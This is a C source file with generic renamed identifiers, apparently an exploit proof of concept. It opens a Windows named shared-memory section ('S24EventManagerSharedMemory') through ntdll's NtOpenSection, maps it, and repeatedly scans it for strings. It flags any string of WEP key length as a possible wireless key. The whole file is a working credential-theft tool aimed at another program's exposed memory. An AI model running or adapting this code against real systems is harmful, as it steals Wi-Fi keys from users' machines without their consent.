
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int buff ;
typedef int UNICODE_STRING ;
struct TYPE_4__ {int QuadPart; } ;
struct TYPE_5__ {TYPE_1__ SectionSize; } ;
typedef TYPE_2__ SECTION_BASIC_INFORMATION ;
typedef scalar_t__ (* PQUERYSECTION ) (int *,int ,TYPE_2__*,int,int ) ;
typedef int (* POPENSECTION ) (int **,int,int *) ;
typedef int OBJECT_ATTRIBUTES ;
typedef int * LPVOID ;
typedef int * HANDLE ;
typedef int DWORD ;


 int FUNC_0 (int *) ;
 int VAR_0 ;
 scalar_t__ FUNC_1 (int ,char*) ;
 int FUNC_2 (int *,int *,int *,int *,int *) ;
 int FUNC_3 (int *,char*) ;
 int FUNC_4 (char*) ;
 int * FUNC_5 (int *,int ,int ,int ,int ) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_6 () ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,...) ;

int FUNC_9(int VAR_3, char* VAR_4[])
{
 OBJECT_ATTRIBUTES VAR_5;
 SECTION_BASIC_INFORMATION VAR_6;
 PQUERYSECTION VAR_7;
 POPENSECTION VAR_8;
 char * VAR_9,VAR_10[256];
 UNICODE_STRING VAR_11;
 LPVOID VAR_12;
 DWORD VAR_13,VAR_14=0,VAR_15=0;
 HANDLE VAR_16;


VAR_8 = (POPENSECTION) FUNC_1( FUNC_4( "ntdll.dll" ),
         "NtOpenSection" );

VAR_7 = (PQUERYSECTION) FUNC_1( FUNC_4( "ntdll.dll"),
       "NtQuerySection" );

FUNC_3(&VAR_11,L"\\BaseNamedObjects\\S24EventManagerSharedMemory");
FUNC_2(&VAR_5, &VAR_11,((void*)0), ((void*)0), ((void*)0) );


VAR_8( &VAR_16, VAR_1|VAR_2, &VAR_5 );

if (VAR_16 == ((void*)0)) FUNC_6();
FUNC_8("Section opened successfully.\n");


VAR_12 = FUNC_5(VAR_16, VAR_0, 0, 0, 0);
if (VAR_12 == ((void*)0)) FUNC_6();

if (VAR_7(VAR_16,0,&VAR_6,sizeof(VAR_6),0)) FUNC_6();

VAR_9= ( char* )VAR_12;
FUNC_8("Scanning section...\n\n");

while(VAR_15<100)
{

 VAR_15++;
 FUNC_8("\nSNAPSHOT ID[%d]----------------[BEGIN]\n\n",VAR_15);

 for (VAR_13=0; VAR_13< VAR_6.SectionSize.QuadPart; VAR_13++)
 {

  if( VAR_9[VAR_13]> 0x29 )
  {
   while( VAR_9[VAR_13] != 0x0 )
   {
    if( VAR_9[VAR_13]>=0x30 )
    {
     VAR_10[VAR_14] = VAR_9[VAR_13];
     VAR_14++;
    }
    VAR_13++;
   }

   VAR_10[VAR_14++]='\0';

   if( VAR_14>3 && VAR_14!=14 && VAR_14!=27 ) FUNC_8(" String collected: %s\n",VAR_10);

   if( VAR_14==14 ) FUNC_8("### Possible Alphanumeric WEP KEY found: %s\n",VAR_10);
   if( VAR_14==27 )
   {
                     if(VAR_10[0]!=0x30 && VAR_10[2]!=0x30 && VAR_10[6]!=0x30)
                          FUNC_8("### Possible WEP KEY found(Ascii/HexMode): %s\n",VAR_10);
                                else
                          FUNC_8(" String collected: %s\n",VAR_10);
                 }
                 VAR_14=0;
  }

 }
FUNC_8("\nSNAPSHOT ID[%d]----------------[END]\n",VAR_15);

FUNC_7(1000);
}

FUNC_0(VAR_16);

return 0;
}
